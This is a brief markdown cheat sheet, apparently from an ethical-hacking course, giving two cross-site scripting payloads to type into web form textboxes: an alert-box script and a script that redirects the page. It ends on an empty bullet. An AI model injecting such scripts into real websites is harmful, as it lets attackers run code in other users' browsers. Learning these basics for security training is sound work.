# EHD Web Application Cheat Sheet

###### tags: `EHD`

## XSS
- Trigger alert in textbox input (Type into textbox)
```html
<script>alert("Hello!")</script>
```

- Redirect to another page (Type into textbox)
```html
<script>document.location="https://www.google.com"</script>
```

- 